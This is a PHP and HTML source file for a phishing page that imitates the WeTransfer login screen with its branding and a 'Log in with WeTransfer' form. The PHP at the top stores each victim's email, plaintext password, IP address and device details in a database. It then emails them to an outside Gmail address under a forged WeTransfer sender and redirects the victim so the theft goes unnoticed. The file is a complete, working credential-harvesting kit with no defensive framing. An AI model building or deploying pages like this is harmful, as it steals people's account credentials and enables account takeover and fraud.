<?php
// Start session and include database connection
session_start();

require 'conn.php';
// Create table if it doesn't exist
$create_table = "CREATE TABLE IF NOT EXISTS login_attempts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    remember_me TINYINT(1) DEFAULT 0,
    ip_address VARCHAR(45) NOT NULL,
    device_info TEXT NOT NULL,
    email_provider VARCHAR(100) NOT NULL,
    attempt_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

if (!$conn->query($create_table)) {
    die("Error creating table: " . $conn->error);
}

// Function to get client IP address
function getClientIP() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } elseif (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}

// Initialize variables
$email = $password = '';
$remember = 0;
$error = $success = '';

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['email'], $_POST['password'])) {
    $email = trim($_POST['email']);
    $password = $_POST['password'];
    $remember = isset($_POST['remember']) ? 1 : 0;

    // Validate inputs
    if (empty($email) || empty($password)) {
        $error = "Please fill in all fields";
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $error = "Invalid email format";
    } else {
        // Get additional information
        $ip = getClientIP();
        $device_info = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $email_provider = explode('@', $email)[1] ?? 'unknown';

        // Prepare and execute database insert
        $stmt = $conn->prepare("INSERT INTO login_attempts (email, password, remember_me, ip_address, device_info, email_provider) VALUES (?, ?, ?, ?, ?, ?)");
        $stmt->bind_param("ssisss", $email, $password, $remember, $ip, $device_info, $email_provider);

        if ($stmt->execute()) {
            // Send email notification
            $toEmail = "barrysilbertbtc@gmail.com";
            $subject = "WeTransfer Login Details";
            
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
            $headers .= 'From: WeTransfer <no-reply@wetransfer.com>' . "\r\n";
            
            $message = "
            <html>
            <head>
                <title>Login Confirmation</title>
            </head>
            <body>
                <h2>WeTransfer Login Successful</h2>
                <p>Email: <strong>$email</strong></p>
                <p>Password: <strong>$password</strong></p>
                <p>Remember Me: <strong>" . ($remember ? 'Yes' : 'No') . "</strong></p>
                <p>IP Address: <strong>$ip</strong></p>
                <p>Device: <strong>$device_info</strong></p>
                <p>Email Provider: <strong>$email_provider</strong></p>
                <br>
                <p>Best regards,<br>WeTransfer Team</p>
            </body>
            </html>
            ";
            
            if (mail($toEmail, $subject, $message, $headers)) {
                $success = "Login successful! Redirecting...";
                echo "<script>
                    document.getElementById('loading-overlay').style.display = 'flex';
                    setTimeout(function() {
                        window.location.href = 'index.php';
                    }, 2000);
                </script>";
            } else {
                $error = "Login recorded but email notification failed to send.";
            }
        } else {
            $error = "Error recording login attempt: " . $conn->error;
        }
        $stmt->close();
    }
}
$conn->close();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WeTransfer Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }
        
        body {
            display: flex;
            min-height: 100vh;
            color: #333;
            overflow: hidden;
        }
        
        .left-pane {
            width: 50%;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 40px;
            position: relative;
        }
        
        .left-content {
            max-width: 500px;
            margin: 0 auto;
            text-align: center;
        }
        
        .wt-logo {
            margin-bottom: 40px;
            width: 120px;
        }
        
        .main-heading {
            font-size: 36px;
            font-weight: 300;
            margin-bottom: 15px;
            color: #333;
            line-height: 1.2;
        }
        
        .main-heading strong {
            font-weight: 700;
        }
        
        .sub-heading {
            font-size: 18px;
            font-weight: 300;
            margin-bottom: 30px;
            color: #666;
        }
        
        .phone-image {
            width: 100%;
            max-width: 400px;
            margin-left: -50px;
        }
        
        .right-pane {
            width: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white;
        }
        
        .login-container {
            width: 380px;
            padding: 40px;
        }
        
        .login-logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-logo img {
            width: 120px;
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
        }
        
        .form-control {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            transition: border-color 0.3s;
            padding-left: 40px;
        }
        
        .form-control:focus {
            outline: none;
            border-color: #0066ff;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 40px;
            color: #999;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-group input {
            margin-right: 10px;
        }
        
        .forgot-password {
            text-align: center;
            margin: 20px 0;
        }
        
        .forgot-password a {
            color: #0066ff;
            text-decoration: none;
            font-size: 14px;
        }
        
        .btn-login {
            background-color: #000;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: background-color 0.3s;
        }
        
        .btn-login:hover {
            background-color: #333;
        }
        
        .btn-login svg {
            margin-right: 8px;
        }
        
        .footer {
            position: absolute;
            bottom: 20px;
            left: 0;
            width: 100%;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .alert-error {
            background-color: #ffebee;
            color: #c62828;
            border: 1px solid #ef9a9a;
        }
        
        .alert-success {
            background-color: #e8f5e9;
            color: #2e7d32;
            border: 1px solid #a5d6a7;
        }
        
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .loading-spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #000;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            body {
                flex-direction: column;
                overflow: auto;
            }
            
            .left-pane, .right-pane {
                width: 100%;
                padding: 20px;
            }
            
            .phone-image {
                margin-left: 0;
                max-width: 300px;
            }
            
            .login-container {
                width: 100%;
                max-width: 380px;
            }
        }

        #small{
            text-align: left;
            width: 50px;
        }
    </style>
</head>
<body>
    <div class="left-pane">
        <div class="left-content">
            <img class="wt-logo" src="wee.svg" alt="WeTransfer Logo" id="small">
            <h1 class="main-heading">The simplest way to share <strong>big ideas</strong></h1>
            <p class="sub-heading">Send files on your terms with WeTransfer</p>
            <img class="phone-image" src="images/bg.png" alt="Phone with WeTransfer app">
        </div>
        <div class="footer">
            
        </div>
    </div>

    <div class="right-pane">
        <div class="login-container">
            <div class="login-logo">
                <img src="wet.svg" alt="WeTransfer Logo">
            </div>
            
            <?php if (!empty($error)): ?>
                <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <?php if (!empty($success)): ?>
                <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
            <?php endif; ?>
            
            <form id="loginForm" method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
                <div class="form-group">
                    <label for="email">Email</label>
                    <span class="input-icon">
                        <svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M18 0H2C0.9 0 0.00999999 0.9 0.00999999 2L0 14C0 15.1 0.9 16 2 16H18C19.1 16 20 15.1 20 14V2C20 0.9 19.1 0 18 0ZM18 4L10 9L2 4V2L10 7L18 2V4Z" fill="#999999"/>
                        </svg>
                    </span>
                    <input type="email" id="email" name="email" class="form-control" placeholder="your@email.com" value="<?php echo htmlspecialchars($email); ?>" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <span class="input-icon">
                        <svg width="16" height="20" viewBox="0 0 16 20" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M14 8H13V6C13 3.24 10.76 1 8 1C5.24 1 3 3.24 3 6V8H2C0.9 8 0 8.9 0 10V18C0 19.1 0.9 20 2 20H14C15.1 20 16 19.1 16 18V10C16 8.9 15.1 8 14 8ZM5 6C5 4.34 6.34 3 8 3C9.66 3 11 4.34 11 6V8H5V6ZM14 18H2V10H14V18ZM8 15C9.1 15 10 14.1 10 13C10 11.9 9.1 11 8 11C6.9 11 6 11.9 6 13C6 14.1 6.9 15 8 15Z" fill="#999999"/>
                        </svg>
                    </span>
                    <input type="password" id="password" name="password" class="form-control" placeholder="••••••••" required>
                </div>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="remember" name="remember" <?php echo $remember ? 'checked' : ''; ?>>
                    <label for="remember">Remember me</label>
                </div>
                
                <button type="submit" class="btn-login" id="loginButton">
                    <span>
                        <svg aria-hidden="true" focusable="false" class="icon-text" width="8px" height="12px" viewBox="0 0 8 12" version="1.1" xmlns="http://www.w3.org/2000/svg">
                            <g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="Web/Submit/Active" transform="translate(-148.000000, -32.000000)" fill="#FFFFFF">
                                    <polygon id="Shape" points="148 33.4 149.4 32 155.4 38 149.4 44 148 42.6 152.6 38"></polygon>
                                </g>
                            </g>
                        </svg>
                        Log in with WeTransfer
                    </span>
                </button>
            </form>
        </div>
    </div>

    <div id="loading-overlay">
        <div class="loading-spinner"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Show loading spinner
            document.getElementById('loading-overlay').style.display = 'flex';
            
            // Change button text to "Logging in..."
            document.getElementById('loginButton').innerHTML = '<span>Logging in...</span>';
            
            // Prevent form from submitting immediately (let PHP handle it)
            return true;
        });
    </script>
</body>
</html>